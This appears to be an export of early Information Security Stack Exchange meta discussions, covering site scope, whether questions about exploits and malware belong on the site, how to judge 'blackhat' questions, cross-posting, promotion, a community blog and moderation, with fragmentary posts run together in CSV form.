But doubling them could bring some disorder. Ideal solution would be just to move them here and maybe leave notice about this replacement on the place of previous topic.

"Where to draw the line between ""IT pro"" vs ""end-user"" questions?","<p>Contrary to my previous answer (which I still prefer - but it looks like its not gonna happen) - if this is an all-inclusive, all-things-information-security, then we should also put more emphasis on other parts of infosec too, such as risk management, cryptography, etc.   </p>

<p>E.g. the following Area51 proposals should also be merged into here:</p>

<ul>
<li><a href=""http://area51.stackexchange.com/proposals/4500/infosec-and-risk-management"">http://area51.stackexchange.com/proposals/4500/infosec-and-risk-management</a></li>

</ul>

<p>I also dislike the name ""IT Security"" (see <a href=""https://security.meta.stackexchange.com/questions/9/is-the-site-name-it-security-or-app-security"">this question</a>), since IT is often understood as ""the IT department of large corporations"", which is still more focused on firewalls and user management.

"Where to draw the line between ""IT pro"" vs ""end-user"" questions?","<p>The thing is that knowledge of how to build malware can be used by three groups of people:</p>

<ul>
<li>those who want to build malware</li>
<li>those who want to defend against malware</li>
<li>those who want to find out who's trying to build malware</li>
</ul>

<p>I say we should allow such questions; people can use their own judgement on whether to answer them and similarly can judge how to use the knowledge imparted in the answers.</p>

<p>By way of analogy, encryption can be used by criminals who want to hide evidence of their crimes. But I doubt you believe that we should not permit discussion of encryption.</p>

Should the FAQ contain guidelines around asking questions that may compromise security?,"<p>Recently I became active on Stackoverflow though I already googled it dozens of times. But there are questions from Programming Gurus and beginners, even questions about macros in Office suites. I thought security.stackexchange.com might have the same scope.</p>

<p>Maybe I am alone with my opinion but I have the feeling that the IT security community is kind of isolated. Everytime I see IT security forums it makes me think IT security is something like rocket science.</p>

<p>And take these questions for instance:</p>

<p><a href=""https://security.stackexchange.com/questions/266/resources-to-learn-about-security"">Resources to learn about security</a></p>

<p><a href=""https://security.stackexchange.com/questions/699/best-website-to-learn-computer-security-basics"">Best website to learn computer security basics?</a></p>

<p>I think they prove that there is a deficit in exchange of IT security knowledge. (And I guess you rarely see these kind of questions on ther IT security forums...) Lots of people (including me) wonder why there are still people out there that do not update their system regularly or think appriopriately about IT security. The knowledge just doesn't flow...</p>

<p>Besides: If there are 95% pro questions about some weird DNS stuff, I guess 5% stupid questions shouldn't bother too much... And maybe a significant share of these might become very engaged in IT security after seeing that the learning slope isn't that steep...</p>

<p>Just my 2 cents...</p>

Though at times it will be difficult to get the information one needs, without revealing some sensitive details... and keeping it anonymous is also not always possible, but we shouldn't make it easier to find that stuff out.  </p>

It might be a bit paranoid, but then that's to be expected here, no?  </p>

<p>While I do think it is important, I also think everybody here can be responsible enough to not post really sensitive information in public. Perhaps a reminder, put it in the FAQ, maybe 3 1/2 words in our blurb, possibly even a banner for new users or once in a while...  </p>

Many questions which <strong>should</strong> be asked here, are instead asked there - and mostly answered - even if often not correctly (ma laasot, programmers dont always know as much security as they think they do :) ).  </p>

<p>So the first thing we'd need to do - get the SO/SF crowds to ask their questions here.<br>
I've gone to many questions, and left a comment saying they'd get better results here - sometimes it works, mostly it doesnt. But that is definitely the first place to go, since most of the users there don't even know about IT Security SE.  </p>

<p>The second part might be harder - the types of people that are not on either site - e.g. CISOs, Risk Managers, consultants, etc. These would also have much higher level of questions...<br>
Near as I can see it, @Robert's <a href=""http://blog.stackoverflow.com/2010/07/the-7-essential-meta-questions-of-every-beta/"" rel=""nofollow"">advice</a> (no.7) still very much applies - we need to get the word out, send the link to all our (professional) contacts, existing communities, conferences, etc.<br>
Personally I already spammed all the infosec groups I'm a member in on LinkedIn, which I think helps a bit... Also sent the link to many clients, colleagues, and other people I work with. I suggest you (and everyone else here) do the same, if you haven't already.<br>
It's also a good idea to give a short talk on this at any industry conference you can, e.g. local OWASP chapters etc.</p>

Where can we go to get more users?,"<p>I think we would do well to add the LinkedIn ""share this"" button on questions and answers.
<a href=""http://www.linkedin.com/publishers"" rel=""nofollow"">http://www.linkedin.com/publishers</a> </p>

<p>My reasoning is that it's more likely that a boss (CTO, Manager) is connected to his employees by LinkedIn than Facebook.  That being the case, the ""LinkedIn"" sharethis button will have more exposure and relevance on this site.</p>

<p>On the other hand, I'm more likely to share recipes, role playing games, and card games on FaceBook.  I don't think I'd ever share that content on LinkedIn.  Imagine an important business contact seeing information about you WoW conquests just as you're working to close a large deal.  Bad idea...</p>

<p>That being said, perhaps some sites will natually be more Facebook oriented, and others be more LinkedIn oriented.  I think this site will be more LinkedIn oriented...</p>

<p>(Disclaimer, I work in Technology and am slightly biased.  Maybe the linkedIn button should be everywhere to recruit industry specialists in that vertical niche market)</p>

Is it a right place to ask about viruses?,"<p>A challenge, especially in the maturing world of Information Security, is that segregating IT security from the other disciplines makes it very difficult to manage a central risk register at board level. </p>

<p>While I got late to this beta, and I agree that this forum seems to be reasonably targeted, a part of me agrees with Gilles, as in my career I provide experience in all these areas, and it isn't that common at corporate level for a client to just ask for one aspect, so for example I might deliver a perimeter app test but also build in social engineering/physical penetration and an internal infrastructure security audit; closing the circle with a review of policies and standards against actual, and against industry expected practice.</p>

<p>Was thinking about the crypto bit - and although it relies on a specialist branch of mathematics, IT security depends in no small way on crypto being implemented correctly.

<p>Are you suggesting anonymous as in not logging in, or log in and post anonymously?  </p>

<p>The second is the only one that makes sense for being able to give feedback (and also prevent abuse).  It would make sense to generate a one-time username that is associated with the question that you can access via your main account.  That way you can log into your normal account, and have your ""anon"" questions visible (only visible to you but not publicly linked to your account).  This would require you to trust the site admins (and possibly moderators).</p>

<p>For partial anonymity, I think most people will be fine with pseudonyms.  Create another ID and use that for sensitive stuff.</p>

<p>For full anonymity, the truly paranoid would need to compartmentalize their questions across many openIDs to reduce the information leakage across multiple questions.  I don't think this is too much of a burden for the few people that need it.  The people with the greatest security needs should pay the most.</p>

Are copyrights/copyright laws an IT Security Professional's responsibility?,"<p>What if the question is answered by a lawyer? :)</p>

<p>I suppose law and IT security have something in common: if you're given bad advice you could end up in jail! I agree that if you want legal advice you should seek legal counsel and that the heart of the question is not really an IT security question. On the other hand the answer was pretty good!</p>

<p>However I believe the answer to your question lies here: <a href=""http://area51.stackexchange.com/proposals/3527/software-law"">Area 51 - Software Law</a>. It seems far more suited for this question (let's hope it's being set up by lawyers!).</p>

Are copyrights/copyright laws an IT Security Professional's responsibility?,"<p>I agree that this is not the place for questions on copyright law, or any other kind of law, IP or otherwise.<br>
(Umm... except for regulation/compliance-related questions, I guess... I'm sure we'll get some SOx experts eventually...)   </p>

<p>However, out of all IT-type personnel, I believe that ITSec folk would have the best ""feel"" for these issues, simply from (a) experience with compliance issues, and (b) overall risk management (for those that do that) - albeit a business risk, and not a technical one. Most likely, the answer should be to point to an actual lawyer - but perhaps not always.... </p>

<p>Like the case under discussion. Again, while I agree that questions that are net about copyrights should be offtopic, this question was more around the viable options for using cryptography.<br>
I'd even say that the question, while a good one, was not expressed well, probably from lack of knowledge of the OP. That is to say, though the question seemed to focus on copyright, what the OP <em>really</em> wanted to know is ""What cryptographic libraries can I use, and what restrictions are there?""<br>
Since it's (usually) on ITSec's recommendation to <em>use</em> crypto, it would be legitimate to expect them to have a viable solution :)  </p>

It is clear that <a href=""https://security.stackexchange.com/q/1533/33"">this question</a> is ontopic, I don't think anyone would object... but its about laws, right? Privacy laws. why is that okay?<br>
Simply put, because there <em>are</em> laws that are in the domain of InfoSec. I don't doubt that I (or privacy expert) would be better suited to answer most practical questions around privacy, than a lawyer. (Though of course when it comes to litigation and potential repurcussions, of course a lawyers input is needed.) To some extent, this applies in other areas, too...</p>

Can we get chat.security.stackexchange.com?,"<p>The links should be presented in a way that is clean, and clearly indicates where it goes.  However, there is no need to establish a mandatory format to be enforced on all posts.  Of course, by all means do clean link formatting up where it appears sloppy or inappropriate.</p>

<p>The ideal format would be to format some descriptive text as a hyperlink, with the full URL to the website used in the tag.  Such as:  <a href=""http://www.youtube.com/watch?v=kAG39jKi0lI"" rel=""nofollow"">My Blackberry Is Broken!</a></p>

<p>Alternatively, if you're in a lazier mood and the full URL is fairly short, simply post some descriptive text next to the URL itself and let StackExchange handle the formatting.  Like:  My Blackberry Is Broken! - <a href=""http://www.youtube.com/watch?v=kAG39jKi0lI"" rel=""nofollow"">http://www.youtube.com/watch?v=kAG39jKi0lI</a></p>

<p>As we are a security-oriented community, and most of us are fully aware of the threats that may lie behind shortened URLS, their use should be avoided.  If you must though, make sure to clearly state what we should be expecting to find on the other side of the link, and where.

How do you avoid answers with subtle security flaws?,"<p>I think there are a couple of reasons the stack exchange model can work well in the information and IT security profession:</p>

<ol>
<li>There is actually quite a small pool
of experienced practitioners, so it
is very easy to get a feel for how
much each individual should be
trusted in different areas, for
example I know a great deal about
the most active posters here and
what areas I would expect them to be
a guru or thought leader. I also
think I'm not bad at reading when
they are providing an answer from
less experience.</li>
<li>Enough people will read Charlie's
answer and go and find out more in
order to confirm it that I think
that is not a worry.</li>
</ol>

<p>Downsides:</p>

<ol>
<li>If Charlie is new and we don't know
who he is, he may get ignored.</li>
<li>Inexperienced people coming here
from a search engine to sort a quick
problem will only look at the top
answer or two.</li>
</ol>

<p>The individuals highly skilled in the information security profession are well known through their actions (publications, talks, code etc) and this industry does very well in identifying those who publicise themselves as security gurus but who aren't. </p>

",<discussion>,9,,266
How do you avoid answers with subtle security flaws?,"<p>I've been torn on this issue, but I'm starting to wonder <strong>why even risk losing legitimate users and content?</strong>  Are we really that worried about exploit code?</p>

<p>Almost all exploits can be legitimately used for pentesting and at the very least illustrating to the CTO/CEO why <em>issue X</em> needs to be handled immediately.  Sometimes it is nearly impossible to make the business case until you show an executive how quickly the exploit can cause damage.</p>

<p>I agree there should be a line drawn somewhere, but I'm beginning to think it should err on the side of exploits and <strong>not</strong> censoring knowledge.  Most likely people on here aren't inventing these exploits so the information is out there anyway for people to find.  At least if it is here we can put it into context.  Under the assumption that most people on here are professionals, <strong>full disclosure benefits us a lot more than the blackhats.</strong></p>

<p>Here are some thoughts:</p>

<ol>
<li>Asking for exploits against a specific person (company) are banned unless client-side information snooping.  ie: attacks against their machines are banned, but tools illustrating auth attacks and weakness like firesheep should be discussed.</li>
<li>Malware construction questions are out of scope. </li>
<li>Even 0-day exploits are useful for testing.  How else can one check if workarounds work?</li>
<li>Personal discretion.  Most of us are professionals.  People should feel free to hold back information if they think it necessary.</li>
<li>Intent.  This is such a weak defense, because it just raises the bar to just phrasing carefully--at least it sets the tone and attitude of the community. </li>
</ol>

<p><strong>note</strong>:
I was torn on the Windows 7 question Rory mentions.  I answered it and then voted to close (after agreeing with AviD's comment on it).  Even bad and closed questions are a chance for people to learn.  And it serves as a record to other people that might ask a similar question.</p>
",<discussion>,9,,266
How do you avoid answers with subtle security flaws?,"<p>I think this is a problem that we may encounter during the youth of the site, while most users have relatively low reputation scores and fairly limited permissions.  Eventually though, that should be a condition we can grow out of.</p>

<p>The ideal solution would be in a scenario where Charlie has enough reputation to edit posts.  Charlie could edit Paulina's answer to reflect the more accurate details.  However, this would only be appropriate if the correct solution was a relatively slight deviation from Paulina's proposal.</p>

<p>Charlie could post his own answer, and flag Paulina's for moderator attention.  If Paulina's answer truly is flawed in a significant way, and it has received an indomitable number of up-votes, it may be worth having it deleted to allow the better solution to rise up.  The moderators should be members who either have earned enough reputation through their work on the site, or who have been voted in because of their recognized experience in the field and demonstration of sound judgment to the community.  Therefore, the moderators should be capable of identifying when deletion of an answer for this reason is reasonable, and taking the appropriate action.</p>

<p>Flagging the answer alone will not likely do the job, since the field in which you give a reason for flagging has character limits akin to those of the comment field.</p>

<p>Of course, Charlie always has the option of down-voting Paulina's answer as well.  But, as stated earlier, one down-vote against the mass of up-votes is not likely to make much difference unless there's a lot of other crypto-wizards around to assist in this effort.</p>

To prevent your question from being flagged and possibly removed, avoid asking subjective questions where …</p>

  <li>your answer is provided along with the question, and you expect more answers: &ldquo;I use _____ for _____, what do you use?&rdquo;</li>
  <li>there is no actual problem to be solved: &ldquo;I&rsquo;m curious if other people feel like I do.&rdquo;</li>
  <li>we are being asked an open-ended, hypothetical question: &ldquo;What if _____ happened?&rdquo;</li>
  <li>it is a rant disguised as a question: &ldquo;_____ sucks, am I right?&rdquo;</li></li>

<p>I'm no IT-Security expert. So I rely on others finding risks/leaks and providing solutions to them. And it really bothers me, when I'm provided with only the solutions, which happens most of the time:</p>

<ul>
<li>sanitize your input</li>
<li>close all unneeded ports</li>
<li>...</li>
</ul>

<p>Why?, because it makes your service safer. But why? As a programmer I've found that by understanding the principles of the language I use and the underlying hardware, my programming abilities improve drastically. The same way I'm sure I could provide a much better job in securing my websites by understanding how the attacks actually work - instead of just being provided with tactics to counter vulnerabilities. I hope that this site adopts a policy of:</p>

<ul>
<li>banning questions that ask for exploit code <em>only</em></li>
<li>encouraging answers that provide solutions together with the attack that caused the vulnerability in the first place.</li>
</ul>

(Closed) questions in top questins active and hot,"<p><em>Following up on <a href=""https://security.meta.stackexchange.com/questions/252/site-promotion-suggestions/256#256"">Jeff's answer</a>:</em></p>
<p>Reminding everyone (whether it is by contest or something else) to keep using the site and asking questions is a great way to keep everyone in the habit returning again and again and using this site in their day-to-day work.</p>
<h3>Community Promotion Contests</h3>
<p>I am compiling ideas for contest of this nature. It will be a bit of a &quot;playbook&quot; of community promotion contests to keep the site energized and help it grow. I'd love to hear some suggestions from the community about <strong>what type of contests you'd like to see.</strong> We have resources to support this sort of thing. Whether it is some sort of funding or back-end development or database support, <strong>post your ideas here!</strong></p>
<p>Promoting more quality questions is a strong step in the right direction; You need those questions to bring in new users. But don't wait on us. You already have a source of high-quality questions here! The <em>real</em> effort that is going to promote healthy, organic growth on this site is <em>using</em> those questions to attract more users.</p>
<p>We find that highlighting your most intriguing questions is the best way to bring new users to this site. Those social bookmarking tools (Facebook, Twitter) are invaluable to highlighting your most intriguing questions and bringing new and interested users into this site.</p>
<p>So a few things: keep the quality high; That is the most important goal at this stage. And use those social bookmarks!</p>

Anyone going to Black Hat ® Technical Security Conference: Abu Dhabi 2011??,"<p>As per Robert's answer regarding competitions, have a look at <a href=""https://gaming.meta.stackexchange.com/q/2010/6028"">this one over on Gaming meta</a>. We don't have exactly the same environment (high profile game releases which SE can send to individuals on release date so they can get some Q&amp;A in on the critical first 2 weeks of a game) so we need to think a little differently.</p>

<ul>
<li>I think we have already shown there is a value proposition around sponsoring individuals to the relevant conferences. So keeping on doing that works, in my view.</li>
</ul>

<p>In the DMZ we have discussed some other options </p>

<p>Rewards for getting x questions, or y links viewed (in addition to your badges - announcer, publicist etc):</p>

<ul>
<li>Licence for software, eg Burp Suite</li>
</ul>

<p>But what could work here is enabling original research and information in response to an incident (which is how the big media activity happens in the security field)</p>

<ul>
<li>assuming delivery can be done quickly, a ""hot"" product (i.e. one in the news, having an incident) gets sent to someone who is willing to do the research on it, and come up with the definitive information.<br>
ie. send an iphone / PS to someone who will do the detailed research and find out the actual situation, instead of relying on FUD. Still limited to specific niches, but could work.</li>
</ul>

<p>Can you think of other ideas in any of the 3 category types described?</p>

<p>I've been in several computer-related user groups which had deals sort of like this.  The vendors regularly sent free books to those groups at which users regularly sent in reviews.  Even simple reviews seemed to be appreciated.</p>

"Would we, as a security community, like a blog?","<p>Guessing the answer is no, but do you know if SE offers a shared email account for ""official business"" on behalf of the community? Clearly this account would be subject to monitoring by SE, and the point of such account would be to represent the both the ""professional"" and ""collective"" nature of the community.</p>

<p>Reason I ask is that my idea would be to attempt to contact top professional security professionals, and offer them a chance to do a guest blog on the SE-Security site.</p>

<p>While doing this via a non-SE channels is clearly possible, it would not reinforce the nature of the request, nor for that matter would it allow SE-Security to maintain relationships with external experts as a community.</p>

<p>If admins had access to a shared account, then I'd be happy to help generate a list of professionals to contact, guidelines for posting to the blog, emails to solicit engagement, etc.</p>

<p>I'd also suggest that the SE-Security community be encouraged to market the blog on behave of the community, possibly in a way that would results in reps being earned by the member.</p>

<p>It would also help if the blog post is VERY clearly marketed on the main SE-Security site and SE-Security-Meta via the standard inline banner alerts at the top of the page; meaning a user always get the alert once, and only once per posting, and that if more than one posting has taken place since they were last on the site, they one get one alert for the most recent SE-Security blog posting.</p>

Cross posting - is it encouraged?,"<p>Personally I prefer migration. I often comment on questions that are relevant to us but get posted at stackoverflow or programmers.se, which often leads to duplication but of course the mods there have the option to migrate, then we can merge the dupes at our end.</p>

<p>Of course, migration from digg, slashdot and friends is not possible because the remote end doesn't understand the protocol. In these cases, we should combine duplication with giving better answers so that the community realises they should come here for security discussion.</p>

<p>One final point: blithely copying any old security question from reddit is not something I'd recommend. Stackexchange works best when we have good quality questions that are consistent with the FAQ guidance, and if you post a random question from the inter webs without understanding its context we may require additional clarification that you can't provide.</p>

Cross posting - is it encouraged?,"<ol>
<li>Reiterating my in-ness.</li>
<li>Scope - this is a bit tricky, since as has often come up, this site has several distinct types of users, and different areas of (exclusive) interest: networks, operating systems (further divided by Windows / Linux / etc), attacking applications (e.g. pentesting, exploits, etc), building applications (e.g. secure coding, code reviews, etc), cryptology, and risk management, just to name a few.<br>
I think the blog should cater to all these, perhaps alternating between them - and preferably, focusing on the ""high level issues"" that should interest most. Given the wide range of specialties of the bloggers, I think it could work to have each blog about their own, with (hopefully) some thread in common. E.g. A monthly ""theme"" could be really interesting, and then ""examine"" it from several different perspectives and focii.<br>
The tricky part is finding the correct balance... and then once in a while, mixing it up by throwing in something not as relevant, but esoteric and interesting nonetheless (I can think up a few ideas like that).<br>
Also, periodically we can check which questions/answers garnered exceptional interest (views+votes), or generated potentially interesting discussions but were not really questions, and do a post on that. </li>
<li>.</li>
<li>I think we can aim for 3 posts every ~2 weeks, but I dont think we need to keep to a strict schedule. Though if we have a large enough pool of potential bloggers, we can set up a rota a few weeks in advance, and even have a few posts in queueue.   </li>

<ol>
<li><p>Duplication of a question across <a href=""http://stackexchange.com/sites"">the Stack Exchange network</a>: asking the <em>same</em> question on multiple Stack Exchange sites.</p>

<p><strong>This is strongly discouraged and often considered grounds for account suspension.</strong> It can be OK to ask a question of different Stack Exchange sites, but you <em>MUST</em> tailor the question to the specific audience on a given site. You can also delete your question (assuming it has not gotten traction) and re-ask it elsewhere.</p></li>
<li><p>Duplication of a question across the broader internet: asking the <em>same</em> question on multiple unrelated websites or mailing lists or what have you.</p>

<p><strong>I think this is absolutely fine, with one caveat</strong> &ndash; if you ask a question in multiple places, you have a civil and moral obligation to keep your question up to date in all the places you asked it. It is not fair to us (or to other communities on the internet..) to get an answer in place 1 of 5 that you asked and abandon the other 4 places. The proper thing to do as a citizen of the internet is update ALL the places you asked with the final answer, so everyone can benefit and as a way of ""paying it forward"" to reciprocate the effort those 5 communities spent on your question trying to help you.</p></li>

How do we provide value to white and grey hats?,"<p>I'm not so sure.<br>
It's perfectly valid, even in a whitehat PoV, to be asking only about the attack, exploit, vector, payload, whatever.<br>
Sometimes it's for a pentest (where mitigation may not be relevant), sometimes its for a tricky bit to find the right e.g. evasion (but the mitigation is clear - e.g. how to exploit a filtered XSS, but fixing XSS is simple and standard).    </p>

<p>Either way, forcing the fix into the question and/or answer just muddles things up, and makes it messier all around.   </p>

<p>And, we're not really preventing blackhats with this, since they can trivially ask for the mitigation, and then promptly ignore it.<br>
Nothing to do about that, c'est la vie - cellphones can be used by terrorists too ;).   </p>

How do we provide value to white and grey hats?,"<p>I think the stack is at loggerheads.</p>

<p>We have a decision to make, attract regular folks with genuine IT Security questions, or continue to attract bits and pieces of the CISSP crowd with sysadmins who've been migrated here from serverfault, and programmers who've migrated from stackoverflow.  </p>

<p>I'm not knocking the site, it's a good resource and I'm finding the opportunity to answer some of these questions helps me dig deeper into knowledge areas I'm already adept with.  Unfortunately in order to get out of beta I think the site is going to have to become friendlier to engineers.  If not users, these individuals can get us closer to going live, and I think it's perfectly acceptable (if we maintain a strict tagging policy) to gain more of that audience.  </p>

  <p>Thoughts?</p>
</blockquote>

<p>There is no such thing as black and white, only shades of gray.</p>

<p>After that deep philosophical bombshell: it's a subjective call. Any information can be used both constructively and destructively. I think the difference is in the impression of intent. The ASLR question, for example, says:</p>

<blockquote>
  <p>How <strong>effective</strong> is ASLR in <strong>preventing</strong>... How hard is it for <strong>an attacker</strong></p>
</blockquote>

<p>For a start, you're not asking: ""how do I bypass ASLR?"". Secondly, the question is posited as an evaluation of the defence and the threat. None of the answers actually detail any mechanisms.</p>

<blockquote>
  <p>What would be some <strong>hypothetical</strong> ways to bypass a captive portal? How <strong>could you bypass</strong> this? </p>
</blockquote>

<p>I won't pass judgement as to whether you intend to use this or not. Likely you don't, as you're here on meta, but see how it looks? What if it was:</p>

<blockquote>
  <p>I have a wireless network with two separate LANs, one isolated to ensure all users sign our AUP with a restricted set of services, and one for users who have signed it. Is it possible for a malicious user to circumvent this and if so how do I prevent it?</p>
</blockquote>

<p>Pretty much the same question, but looks totally different in terms of intent. If I were  to draw the line in the sand, I would say the key in my version would be that you're coming at it from a defence angle too. </p>

<p>Do I think it should have been closed? Don't know. Moderators are only other human beings and they sometimes make mistakes, but I can see what their reasoning might have been. </p>
",<discussion><acceptable-question><black-hat>,10,,387
What determines if a question should be considered Blackhat?,"<p>I didn't get involved in moderating your original question, and will not defend or decry the position taken by another mod. However, I will say that <em>my</em> evaluation of that question is that it's overly vague. ""How can a network's captive portal be bypassed"" depends on the implementation of the captive portal, its integration into the host network and how much access an attacker has. Even if a good answer using assumptions based on today's common practice were provided, that answer could quickly become outdated or may not apply to the situation you're asking about.</p>

<p>I would prefer to see a question that details the situation you're working with, and asks for discussion of the residual risk and remaining attacks against that situation. Honestly, whether you intend to use that information for evil is unimportant to me for the purposes of deciding whether you get a good answer (though of course I would frown on evil applications, and remind you to check the legality of any actions you take). My reasoning is that even if you choose to use the site's powers for good, someone else will not.</p>
",<discussion><acceptable-question><black-hat>,10,,387
What determines if a question should be considered Blackhat?,"<p>I think we should welcome most any question where a good answer requires what I'll call a <strong><em>security mindset</em></strong>.  I think that our expertise in that area is what distinguishes this site from most of the others.</p>

<p>Many folks, whether sysadmins or programmers or managers or the proverbial grandmother are just trying to get a task done and will often take a shortcut without thinking about the consequences.  This is the site where all those sorts of folks should get to interact with people who are adept at seeing the problem from all angles, thinking like an attacker, and explaining the consequences, and how to avoid such problems and design for security.</p>

<p>It is an advantage to be able to help all those folks see this mindset in action for their home systems.  The major downside I'm concerned about is that some great IT folks will get tired of seeing questions about ""mere"" home systems.  To them I suggest that the growing wave of spearfishing attacks means that we actually do have to get end users educated about these things, and we often want their home systems secure also.  So I think it is shortsighted to restrict this to what the ""pros"" want to talk about.  Keeping an ear to the ways that end-users think about things will help us design improved user experiences and better  explain things to our users.</p>

What determines if a question should be considered Blackhat?,"<p>Got to this meta question quite late, but I'll try and articulate my thoughts on the matter:</p>

<p>A key difference between black and white hats is that white hats try to help, to fix, to find the problems and teach the admins how to remediate.</p>

<p>So in my opinion providing education so that security professionals can not only learn how to break, attack, exploit etc. but also to detect attacks, identify issues, fix problems and protect assets is what can make a question or answer white hat.</p>

<p>So let us not just ask for exploits, or tell people how to break in, lets provide guidance on how to keep the bad guys out! </p>
",<discussion><acceptable-question><black-hat>,10,,387
What determines if a question should be considered Blackhat?,"<p>The reason I think this issue is important is because it will affect how the site is viewed by the most savvy and potentially helpful white-hats out there.  I want them to get involved here.  If the site has lots of questions that would appear shady to a first-time googler, they are simply less likely to want to associate themselves with it.  So how things are worded is important, not just the technical content.</p>

<p>Beyond that, I think that setting a constructive tone of voice is also an important element of how to word questions here, so that even when they technically are useful to both extremes, they are slightly more helpful to the white hats and at the same time are less attractive or helpful to the script kiddies.  Though I also am not generally a fan of ""politically correct"" language, I think we should try to move the questions and answers here in the direction of being ""professional"".</p>

<p>One aspect of that is that in cases like this one, questions be worded to ask for help with mitigating any weaknesses, as well as avoiding explicit exploit code.</p>

<p>I'll also agree, as Ninefingers notes, that there is indeed a lot of grey in between white and black.  Unfortunately this introduces more room for ""subjective"" interpretations which can easily get out of hand.  This can easily lead to jumping to conclusions and being rude with each other, and I urge folks to recognize that and try to avoid it.</p>

Is reputation the same between meta and main?,"<p>Borrowing the numbers from the question:</p>

<ol>
<li>I think it's a great idea, and could probably contribute regularly-but-infrequently. Due to time commitments on other community projects I'd better not be driving it :)</li>
<li>Putting on my ""pro tem mod"" hat, I think the audience has to be site contributors and <em>those who are not yet site contributors, but would be if they knew about the cool discussions we were having</em>. That informs the choice of content too. I say a good way to pick a topic is to find an interesting question on the site, then talk about issues related to that question (without necessarily answering it in the blog post). This can get readers interested in that question and perhaps thinking about new answers, from where they might answer other questions and even become regular contributors.
Eventually such posts can be derived from ""recent"" interesting questions, but initially they can come from <em>any</em> interesting question because most potential blog readers won't have seen any of the site content.</li>
<li>If you can find four people who are willing to write a post every month, you already have a post every week. If you can harangue people in the main site to write guest posts every now and again, then you don't even need a core of regulars :).</li>
<li>I don't think a schedule is a key feature for any blog. Looking at stats for my blogs, more than half of the readers come from RSS and most of the remainder are 'refered' (to borrow HTTP's spelling) by Twitter. This makes me think most readers see a new post and read it: they aren't checking in at 9am every Friday because that's New Post O'Clock™.</li>

<p>In the logo, I try to keep the site name the most visible almost other part of the cipher. Reinforce the <code>ITSECURITY</code> part, in contrast to META. Maybe the same should be done with <code>IT</code> on main site.</p>

<p>It is intended to express the fact that within (Meta-)StackExchange, (META)ITSECURITY is the key to understand security.</p>

<p>What I like:</p>

<ul>
<li>It's using a cryptographic paradigm (the cipher)</li>
<li>It combines site name to stackexhange name</li>
</ul>

<p>What I do no like in my work:</p>

<ul>
<li>Integration feels odd. But I guess that with some transparency tuning or so it could go well.</li>
<li>The logo feel big compared to other SE sites.</li>

"In planning for that time when we leave beta, we need a visual identity","<p>I'm no graphic designer, but I think the essence of security and this site involves the eternal evolution of the cat-and-mouse game.  Protecting assets from threats, and seeing what the threat learns and countering that.  So something that reflects the mindset of constantly evolving to match an adversary would be cool.</p>

<p>E.g. a graphical representation of a flanking maneuver, or ""and now for something completely different"", and a response to that.</p>

<p>One of the most important tools for engineering a security design, is Threat Modeling - which, most effectively, leverages a form of DFD using trust boundaries, and so forth.   </p>

<li>I like @AviD's idea of asking relevant questions before the conference, and then tweeting them during the conference. Timely content is very powerful. One minor issue with that is that I don't spend a whole lot of time on this site, so my knowledge of what questions have been asked is very limited. I think a good way to solve this would be to start a meta thread listing all the <a href=""http://blackhat.com/html/bh-us-11/bh-us-11-briefings.html"" rel=""nofollow noreferrer"">Black Hat talks for this year</a>, and then under each talk we can list current questions relevant to that topic that I can tweet. That way all I have to do is go to that list for each talk, and tweet away. As a bonus, doing this will make it easier for folks to see what topics will be covered, and come up with relevant questions on those topics if there are none on the site yet. Thoughts on this?</li>
<li>Assuming the custom swag is ready in time for the conference, in addition to tweeting relevant questions during the conference, what if I also tweet things like:</li>

"Personal, home computer questions on-topic?","<p>I would argue that the equipment and location do not matter as much as the concepts in the question. Some people use 'buesiness class' computers at home, or they work from home. You also don't need to be protecting 100 machines to ask a relevent question. For example, asking about <a href=""https://security.stackexchange.com/questions/5075/three-factor-authentication-for-windows"">Three-factor authentication for windows</a> is relevent. Even if it just for someone's personal laptop.  Given it is a lot more likely that a corporate IT professional managing a fleet of desktops asks a relevent question than a home user.  </p>

<p>If you're looking for the expertise of a security professional, an answer that can be phrased in security / risk terms - it's on topic, even if you want to set up your own home network.<br>
On the other hand, even if you're managing warehouses of servers, if all you want is ""gimme shome script so I can foget about the stupid firewall"", then I don't think this is the place for you.   </p>

<p>Admittedly my thinking on this has evolved over the course of the beta, and I think we've seen some very good ""personal computer"" security questions - and also some very BAD ""corporate"" questions.   </p>

<blockquote>

</blockquote>

<p>So it sounds like these days it is intended to be a group process.</p>

<p>As for the bigger issue, my first question is which do we want - law or legal. It seems like we'd want a discussion before a huge amount of retagging....</p>

<ul>
<li>What were the stats on them before you started retagging?</li>
<li>What do other SE's use?</li>
<li>Are there any tools to help us decide?</li>
</ul>

<p>But assuming for the moment that we do agree that law should be a synonym for legal (and I actually do agree), then I can confirm that I get the same error you do when proposing that, and that seems like a misfeature for sure.</p>

<p><strong>Update</strong>: According to the popups I get while choosing a tag at <a href=""http://stackexchange.com/filters/17212/my-filter"">http://stackexchange.com/filters/17212/my-filter</a>, legal has 1258 hits on SE, while law has 176.  And @rebecca-chernoff says that the way to deal with the current situation is to down-vote the current proposal to make legal a synonym for law (at <a href=""https://security.stackexchange.com/tags/law/synonyms"">https://security.stackexchange.com/tags/law/synonyms</a>, oddly enough, not at the legal tag) to -2 so it goes away and we can (try again to) propose ""law"" as a synonym for ""legal"".  Unfortunately even though we are out of beta, few people have enough rep to do so - look at <a href=""https://security.stackexchange.com/tags/legal/topusers"">https://security.stackexchange.com/tags/legal/topusers</a> (or is it topusers for law??) to see if you qualify.  And I don't know how to interpret that page either, there are two columns of numbers - what do they mean?....  And since law has already mostly been retagged as legal, it may be impossible to find anyone who has the rep to vote.  So again I conclude that this is broken, and we rely again on mods to do all this.  Or at least it is insecure, since lots of people can edit tags, and edit themselves into a position to vote on something that they've demonstrated no knowledge of.....</p>

How pro-active or reactive are the site moderators regarding poor questions?,"<p>Somewhere in between.   </p>

<p>Especially now that traffic is picking up, it's likely that the moderators will miss a post that needs moderating.  </p>

<p>If we do notice a <em>clearly</em> problematic post, we obviously jump on it, as soon as we see it.<br>
If we don't see it right away, we do depend a lot on flagging from other users.<br>
We also expect a certain level of self-moderation from the community - users can either edit a bad post, or even propose and edit if they dont have enough reputation. High privileged users can also vote to close a question. (Moderators can't actually just vote like others, since their vote is automatically binding.)  </p>

<p>There are also a lot of gray areas - such as the one you linked to. Speaking as the commenting moderator in question, my purpose was agreeing with you: it is a trivial question, as such it is a <em>poor</em> question. However, whether it is poor enough to close outright, or not, is as of yet undecided. For that, we're waiting for more consensus from the community.<br>
